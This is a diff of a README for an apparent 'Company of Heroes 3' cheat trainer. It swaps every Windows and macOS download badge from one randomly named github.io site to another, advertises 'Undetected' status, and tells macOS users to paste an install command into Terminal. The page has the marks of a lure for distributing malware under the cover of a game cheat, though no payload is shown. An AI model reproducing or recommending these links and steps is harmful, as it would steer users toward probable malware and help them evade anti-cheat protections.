@@ -1,9 +1,9 @@
 # 🎮 Company of Heroes 3 Trainer — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://wccorxpwogeu.github.io/setup-win2/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://wccorxpwogeu.github.io/install-mac2/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://wccorxpwogeu.github.io/setup-win2/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://wccorxpwogeu.github.io/setup-win2/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://iuoneuelxrhu.github.io/dl-windows2/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://iuoneuelxrhu.github.io/macos-setup2/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://iuoneuelxrhu.github.io/dl-windows2/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://iuoneuelxrhu.github.io/dl-windows2/)
 
 > The most trusted **Company of Heroes 3 Trainer** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
 
@@ -45,14 +45,14 @@
 5. 🎮 Launch **Company of Heroes 3** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://wccorxpwogeu.github.io/setup-win2/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://iuoneuelxrhu.github.io/dl-windows2/)
 
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://wccorxpwogeu.github.io/install-mac2/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://iuoneuelxrhu.github.io/macos-setup2/)
 
 **Menu Controls**
 
